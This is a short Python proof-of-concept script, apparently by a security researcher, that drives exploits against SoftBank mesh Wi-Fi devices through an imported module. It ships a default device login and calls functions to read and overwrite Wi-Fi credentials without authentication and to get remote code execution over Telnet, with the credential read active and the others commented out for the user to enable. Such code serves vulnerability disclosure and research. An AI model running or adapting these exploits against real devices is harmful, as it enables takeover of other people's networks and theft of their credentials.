# main.py
# @package   SoftBank Mesh API
# @author    Samy Younsi - NeroTeam Security Labs <samy@neroteam.com>
# @license   Proprietary License - All Rights Reserved
# @docs      https://neroteam.com/blog/

import sbmeshAPI

device = {
    "mesh_ip": "INSERT_YOUR_DEVICE_IP",
    "mesh_username": "user",
    "mesh_password": "RTconf01",
    "wifi_name": "ThePromisedLan",
    "wifi_password": "00000000",
}

"""
Uncomment to use exploits =>

setWifiCreds() and getWifiCreds() NO AUTH REQUIRED

execTelnetRce() - AUTH REQUIRED (mesh_username - mesh_password)
"""

# response = sbmeshAPI.execTelnetRce(device)
# print(response)

# response = sbmeshAPI.setWifiCreds(device)
# print(response)

response = sbmeshAPI.getWifiCreds(device)
print(response)
